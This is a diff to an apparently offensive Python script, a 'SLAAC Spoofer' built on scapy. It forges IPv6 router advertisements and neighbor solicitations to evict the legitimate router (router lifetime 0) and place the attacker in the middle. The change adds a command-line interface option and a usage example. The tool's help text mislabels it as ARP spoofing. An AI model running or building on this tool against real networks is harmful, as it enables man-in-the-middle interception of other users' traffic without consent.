@@ -18,7 +18,7 @@ from scapy.all import sr1, IP, ICMP
 # With a router lifetime of 0 essintially making them unreachable and booting that router (it actually works lol)
 # Now we can simulate a evil twin like attack and send Router advertisements of our own!
 # This script will put us in the middle!
-
+# Important to note this script only assumes that one router is present
 
 def sendNDP_NS(attacker_ipv6, attacker_mac, router_ip, interface):
     '''
@@ -85,7 +85,13 @@ def main():
     # print("Available network interfaces:")
     # print(interfaces)
     # User needs to select interface and thats it
-    interface = "en0"
+    parser = argparse.ArgumentParser(
+        description="SLAAC Spoofer - A tool for ARP spoofing attacks\nExample: sudo python3 ARP_POISION.py -i <interface> ")
+
+    parser.add_argument(
+        "-i", "--interface", help="Interface", required=True)
+    args = parser.parse_args()
+    interface = args.interface
     attacker_ipv6 = ni.ifaddresses(interface)[AF_INET6][0]['addr']
     attacker_ipv6 = attacker_ipv6.split('%')[0]
     attacker_mac = ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']
